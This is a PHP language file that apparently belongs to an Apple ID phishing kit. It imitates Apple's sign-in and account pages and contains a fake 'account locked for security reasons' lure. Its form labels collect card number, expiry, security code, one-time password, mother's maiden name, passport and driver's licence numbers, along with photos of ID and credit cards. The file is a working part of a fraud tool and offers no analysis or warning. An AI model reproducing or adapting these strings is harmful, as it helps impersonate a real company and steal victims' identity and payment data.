<?php



###############Homepage##########
$_LANG['SIGNIN'] = "Log in";
$_LANG['SIGNUP'] = "Create Apple&nbsp;ID&nbsp;";
$_LANG['FORGOT'] = "Forgot&nbsp;Apple&nbsp;ID&nbsp;or password?";
$_LANG['TITLE'] = "Your account for everything&nbsp;Apple.&nbsp;";
$_LANG['TITLE2'] = "A single Apple&nbsp;ID&nbsp;and password gives you access to all&nbsp;Apple&nbsp;services.";
$_LANG['TITLE3'] = "Learn more about Apple&nbsp;ID&nbsp;";
###############Signin############
$_LANG['MANAGE'] = "Manage Your Apple Account";
$_LANG['PASS'] = "Password";
$_LANG['WRONG'] = "Your Apple&nbsp;ID or password is incorrect.";
$_LANG['FORGOT'] = "Forgot Password?";
$_LANG['REMMBR'] = "Remember me";
$_LANG['PLCHDR'] = "Apple ID";
###############SLEKEK############
$_LANG['REASON'] = "This Apple ID has been locked for security reasons.";
$_LANG['REASON2'] = "You must unlock your account before signing in.";
$_LANG['UNLOCKACC'] = "Unlock Account";
$_LANG['DASHBD'] = "Account Verification";
$_LANG['URAPPL'] = "Your Apple ID is";
$_LANG['SIGNOUT'] = "Sign Out";
$_LANG['WAIT'] = "Please wait while we restore your account access...";
$_LANG['PROVIDE'] = "Please provide photo of your ID Card and Credit Card.";
$_LANG['FORYOUR'] = "For your security you will automatically be logged out. ";
$_LANG['CONFIRM']= "Confirm your identity";
###############FORM##############
$_LANG['PERSON'] = "Personal information";
$_LANG['NAME'] = "Name";
$_LANG['FN'] = "First name";
$_LANG['MN'] = "Middle name (Optional)";
$_LANG['LN'] = "Last name";
$_LANG['DOB'] = "Date of Birth";
$_LANG['PHONE'] = "Telephone";
$_LANG['PHONENUMB'] = "Phone Number";
$_LANG['ADDRESS'] = "Address Line";
$_LANG['CITY'] = "Town / City";
$_LANG['POSTCODE'] = 'Postal / ZIP Code';
$_LANG['COUNTRY'] = "$nama_negara";
$_LANG['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="State / Province">
</div>
</div>
';
###############ACCDETAILS#######
$_LANG['ACCDET'] = "Account details";
$_LANG['CARDDET'] = "CARD DETAILS";
$_LANG['CARDHOLD'] = "Cardholder's name";
$_LANG['CARDNUM'] = "Card number";
$_LANG['CARDEXP'] = "Date of Expiry";
$_LANG['CARDCSC'] = "Card Security Code";
$_LANG['CARDOTP'] = "One Time Password";
###############SECURITY#########
$_LANG['SECURITY'] = "Security";
$_LANG['QUESSELC'] = "SELECT&nbsp;A SECURITY QUESTION";
$_LANG['MTHRMDN'] = "Mother's Maiden Name";
$_LANG['DRVRLCNS'] = "Driver's license number";
$_LANG['PASSPRT'] = "Passport number";
$_LANG['ANSWR'] = "answer";
$_LANG['NEXT'] = "Next";
$_LANG['FINISH'] = "Finish";
##############FOOTER############
$_LANG['FOOTERLINE1'] = "Shop the <a href='#'>Apple Online Store</a> (0800 048 0408), visit an <a href='#'>Apple retail store </a>, or find a <a href='#'>distributor</a>.";
$_LANG['FOOTERLINE21'] = "Apple Information.";
$_LANG['FOOTERLINE22'] = "Site Map";
$_LANG['FOOTERLINE23'] = "Hot News";
$_LANG['FOOTERLINE24'] = "RSS Feeds";
$_LANG['FOOTERLINE25'] = "Contact Us";
$_LANG['COPYR'] = "Copyright © 2017 Apple Inc. All rights reserved.";
$_LANG['TERMCN'] = "Terms of use";
$_LANG['PRVPLCY'] = "Privacy Policy";
?>